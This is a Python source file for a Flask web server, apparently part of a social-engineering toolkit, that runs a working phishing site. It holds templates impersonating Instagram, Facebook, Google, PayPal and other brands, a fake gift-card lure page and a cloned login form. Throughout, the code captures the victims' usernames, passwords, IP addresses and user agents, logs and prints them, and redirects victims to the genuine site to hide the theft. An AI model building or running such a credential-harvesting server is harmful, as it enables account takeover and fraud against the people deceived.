"""Cywallearn SET - Web Phishing Server"""

import os
import sys
import json
import time
import threading
from datetime import datetime
from flask import Flask, request, render_template, redirect, send_from_directory

# Add parent to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))
from core.logger import Logger
from core.config import Config

logger = Logger()
BASE_DIR = os.path.join(os.path.dirname(__file__), '..', '..')

class PhishingServer:
    TEMPLATES = {
        'instagram': {'name': 'Instagram', 'redirect': 'https://www.instagram.com'},
        'facebook': {'name': 'Facebook', 'redirect': 'https://www.facebook.com'},
        'google': {'name': 'Google', 'redirect': 'https://accounts.google.com'},
        'twitter': {'name': 'Twitter/X', 'redirect': 'https://twitter.com'},
        'linkedin': {'name': 'LinkedIn', 'redirect': 'https://www.linkedin.com'},
        'tiktok': {'name': 'TikTok', 'redirect': 'https://www.tiktok.com'},
        'snapchat': {'name': 'Snapchat', 'redirect': 'https://www.snapchat.com'},
        'netflix': {'name': 'Netflix', 'redirect': 'https://www.netflix.com'},
        'amazon': {'name': 'Amazon', 'redirect': 'https://www.amazon.com'},
        'paypal': {'name': 'PayPal', 'redirect': 'https://www.paypal.com'},
        'quiz': {'name': 'Quiz->Login', 'redirect': 'https://www.instagram.com'},
        'captcha': {'name': 'Captcha', 'redirect': 'https://www.google.com'},
    }
    
    def __init__(self, template='instagram'):
        self.template = template
        self.info = self.TEMPLATES.get(template, {'name': template, 'redirect': 'https://example.com'})
        self.app = Flask(__name__, template_folder=self._get_template_dir())
        self._setup_routes()
    
    def _get_template_dir(self):
        return os.path.join(BASE_DIR, 'modules', 'web_phishing', 'templates', self.template)
    
    def _setup_routes(self):
        @self.app.route('/')
        def index():
            return self._render_page()
        
        @self.app.route('/login', methods=['GET', 'POST'])
        def login():
            if request.method == 'POST':
                username = request.form.get('username', '').strip()
                password = request.form.get('password', '').strip()
                ip = request.remote_addr
                ua = request.headers.get('User-Agent', 'Unknown')
                
                if username and password:
                    logger.capture(self.info['name'], username, password, ip, ua)
                    print(f"\n[!] {self.info['name']} CREDENTIALS CAPTURED!")
                    print(f"    Username: {username}")
                    print(f"    Password: {password}")
                    print(f"    From IP: {ip}\n")
                
                return redirect(self.info['redirect'])
            
            return self._render_login()
        
        @self.app.route('/<path:path>')
        def static_files(path):
            return send_from_directory(self._get_template_dir(), path)
    
    def _render_page(self):
        index_path = os.path.join(self._get_template_dir(), 'index.html')
        if os.path.exists(index_path):
            with open(index_path) as f:
                return f.read()
        return self._generate_default_page()
    
    def _render_login(self):
        login_path = os.path.join(self._get_template_dir(), 'login.html')
        if os.path.exists(login_path):
            with open(login_path) as f:
                return f.read()
        return self._generate_default_login()
    
    def _generate_default_page(self):
        return f"""<!DOCTYPE html>
<html><head><title>{self.info['name']} - Exclusive Offer</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* {{ margin:0; padding:0; box-sizing:border-box; font-family:-apple-system, sans-serif; }}
body {{ background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }}
.card {{ background:white; max-width:400px; width:100%; border-radius:20px; padding:30px; box-shadow:0 20px 60px rgba(0,0,0,0.3); text-align:center; }}
.logo {{ font-size:36px; margin-bottom:10px; }}
h1 {{ font-size:22px; color:#333; margin-bottom:8px; }}
p {{ color:#666; font-size:14px; margin-bottom:20px; line-height:1.5; }}
.badge {{ display:inline-block; background:#e8f0fe; color:#667eea; padding:4px 12px; border-radius:20px; font-size:11px; font-weight:600; margin-bottom:15px; }}
.btn {{ display:inline-block; background:#667eea; color:white; padding:14px 40px; border-radius:10px; text-decoration:none; font-weight:600; font-size:16px; transition:0.3s; }}
.btn:hover {{ transform:translateY(-2px); box-shadow:0 8px 25px rgba(102,126,234,0.4); }}
.social {{ margin:20px 0; display:flex; justify-content:center; gap:10px; }}
.social span {{ background:#f0f0f0; padding:10px 15px; border-radius:10px; font-size:12px; }}
.footer {{ font-size:11px; color:#aaa; margin-top:15px; }}
</style></head><body>
<div class="card">
<div class="badge">✨ OFFICIAL PARTNER</div>
<div class="logo">🎁</div>
<h1>Win a ${self.info['name']} Gift Card!</h1>
<p>Complete a quick survey and get a chance to win exclusive prizes. Limited time offer!</p>
<a href="/login" class="btn">Claim Your Reward →</a>
<div class="social"><span>🔥 2,847 claimed</span><span>⭐ 4.8 rating</span></div>
<div class="footer">Terms & Conditions apply. Authorized promotion.</div>
</div></body></html>"""
    
    def _generate_default_login(self):
        platform = self.info['name']
        return f"""<!DOCTYPE html>
<html><head><title>{platform} - Login</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
* {{ margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; }}
body {{ background:#fafafa; display:flex; justify-content:center; align-items:center; min-height:100vh; }}
.container {{ max-width:350px; width:100%; padding:20px; }}
.login-box {{ background:white; border:1px solid #dbdbdb; padding:40px 40px 20px; text-align:center; border-radius:1px; margin-bottom:10px; }}
.logo {{ font-size:32px; font-weight:700; margin-bottom:20px; color:#262626; }}
.alert {{ background:#fff3cd; border:1px solid #856404; color:#856404; padding:10px; border-radius:4px; margin-bottom:15px; font-size:12px; }}
.input-group {{ margin-bottom:6px; }}
.input-group input {{ width:100%; padding:9px 8px; background:#fafafa; border:1px solid #dbdbdb; border-radius:3px; font-size:12px; outline:none; }}
.input-group input:focus {{ border-color:#a8a8a8; }}
.login-btn {{ width:100%; padding:7px; background:#0095f6; color:white; border:none; border-radius:4px; font-weight:600; font-size:14px; cursor:pointer; margin-top:8px; }}
.login-btn:hover {{ background:#0081d6; }}
.or-divider {{ display:flex; align-items:center; margin:16px 0; }}
.or-divider::before,.or-divider::after {{ content:''; flex:1; height:1px; background:#dbdbdb; }}
.or-divider span {{ color:#8e8e8e; font-size:13px; font-weight:600; margin:0 18px; }}
.signup-box {{ background:white; border:1px solid #dbdbdb; padding:20px 40px; text-align:center; }}
</style></head><body>
<div class="container">
<div class="login-box">
<div class="logo">{platform}</div>
<div class="alert">Please verify your account to claim your reward!</div>
<form method="POST" action="/login">
<div class="input-group"><input type="text" name="username" placeholder="Username or email" required></div>
<div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
<button type="submit" class="login-btn">Log In</button>
</form>
<div class="or-divider"><span>OR</span></div>
<a href="#" style="font-size:12px;color:#00376b;text-decoration:none;">Forgot password?</a>
</div>
<div class="signup-box"><p>Don't have an account? <a href="#" style="color:#0095f6;font-weight:600;text-decoration:none;">Sign up</a></p></div>
</div></body></html>"""
    
    def run(self):
        port = Config.PHISHING_PORT
        print(f"\n[+] Starting {self.info['name']} phishing server on port {port}")
        print(f"[+] Local URL: http://127.0.0.1:{port}")
        print(f"[+] Login page: http://127.0.0.1:{port}/login")
        print(f"[+] Press Ctrl+C to stop\n")
        
        self.app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)